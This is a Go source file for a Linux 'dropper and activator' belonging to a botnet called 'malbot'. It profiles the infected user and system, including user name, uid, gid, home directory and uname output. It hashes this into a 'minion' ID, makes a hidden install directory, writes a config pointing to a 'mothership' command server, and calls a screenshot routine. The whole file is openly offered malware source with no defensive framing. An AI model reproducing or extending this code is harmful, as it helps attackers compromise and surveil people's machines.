package main

/*
  * Linux dropper and activator
*/

import(
  "os"
  "log"
  "fmt"
  //"strings"
  "runtime"
  "os/user"
  "os/exec"
  "io/ioutil"
  "path/filepath"
  "crypto/sha256"
  "text/template"
)


type Minion struct{
  MinionId string `json:"minionid"`
  Name string `json:"name"`
  UName string `json:"unsme"`
  Userid string  `json:"uid"`
  Groupid string  `json:"groupid"`
  HomeDir string `json:"homedir"`
  Os  string  `json:"ostype"`
  Description string `json:"description"`
  Installed bool `json:"installed"`
  MotherShipId string `json:"mothershipid"`
  LastSeen string `json:"lastseen"`
  CreatedAt string  `json:"createdat"`
  UpdatedAt string  `json:"updatedat"`
}
var text = `
# Configuration files for malbot
#Identifies bot as a  minion
Minion ID: {{.MinionId}}
# Minion's Data
Name: {{.Name}}
UName: {{.UName}}
Userid: {{.Userid}}
Groupid: {{.Groupid}}
HomeDir: {{.HomeDir}}
# Operating System type
Os: {{.Os}}
#Description of os properties
Description: {{.Description}}
# Sets to true if minion is installed on auto run/start/boot up
Installed:  {{.Installed}}
# Domain of machine the infected it
MotherShipId: {{.MotherShipId}}
`
//https://gist.github.com/jim3ma/00523f865b8801390475c4e2049fe8c3
func Start(done bool)(*Minion,error){
  gu,err := GetUser()
  if err != nil{
    return nil,err
  }
  var minion  Minion
  if CheckFileExist(filepath.Join(gu.HomeDir+"/.malbot/malbot.config")){
    minion = Minion{
      MinionId:CreateHash(gu),
      Name: gu.Name,
      UName: gu.Username,
      Userid: gu.Uid,
      Groupid: gu.Gid,
      HomeDir: gu.HomeDir,
      Os: RetOsType(),
      Description: ExecuteCommand("uname", "-a"),
      Installed: false,
      MotherShipId:"127.0.0.1:3000",
    }
    return &minion,nil
  } else {
    installDir := filepath.Join(gu.HomeDir+"/.malbot")
    fmt.Println("[+] HOME: ",gu.HomeDir)
    if !CreateDir(installDir,0755){
      log.Println("[-] Error creating instalation dir: ");return nil,err
    }
    config := filepath.Join(gu.HomeDir+"/.malbot"+"/malbot.config")
    fmt.Println("[+]  Creating configuration file.")
    var ms = "127.0.0.1:3000"
    description := ExecuteCommand("uname", "-a")
    fmt.Println("[+]  Writing data to config file.")
    minion = Minion{
      MinionId:CreateHash(gu),
      Name: gu.Name,
      UName: gu.Username,
      Userid: gu.Uid,
      Groupid: gu.Gid,
      HomeDir: gu.HomeDir,
      Os: RetOsType(),
      Description: description,
      Installed: false,
      MotherShipId:ms,
    }
    _,e := takeScreenShot()
    if !e{
      fmt.Println("Check your directory")
    }
    file,err := os.Create(config)
    if err != nil {fmt.Println("[-] Error creating config file: ",err)}
    defer file.Close()
    t := template.New(config)
    t.Parse(text)
    t.Execute(file,minion)
    fmt.Println("[+]  Summoning The Oracle after alighning stuff")
    return &minion,nil
  }
  fmt.Println("[+]  Course is clear, Summoning The Oracle")
  return &minion,nil
}

func CreateHash(data interface{})string{
  hash := sha256.New()
  hash.Write([]byte(fmt.Sprintf("%v",data)))
  return fmt.Sprintf("%x",hash.Sum(nil))
}

func GetUser()(*user.User,error){
  cur,err := user.Current()
  if err != nil{ return nil,err}
  return cur,nil
}


func RetOsType()string{
  return runtime.GOOS
}

func CheckFileExist(filePath string) bool {
	if _, err := os.Stat(filePath); os.IsNotExist(err) {
		return false
	} else {
		return true
	}
}
func CreateDir(dirPath string, fileMode os.FileMode) bool {
	err := os.MkdirAll(dirPath, fileMode)
	if err != nil {
    log.Println(err)
		return false
	}
	return true
}

func ReadFile(name string){
  data,err := ioutil.ReadFile(name)
  if err != nil { log.Println("[+] Error reading file: ",err)}
  fmt.Println(data)
}

func ExecuteCommand(cmd string, args string)string{
  out,err := exec.Command(cmd,args).Output()
  if err !=  nil {
    ss,_ := fmt.Printf("%s",err)
    return string(ss)
  }
  return string(out[:])
}

//@TODO Remove this for brevity and change to methods of a bot (call this iniatializer)
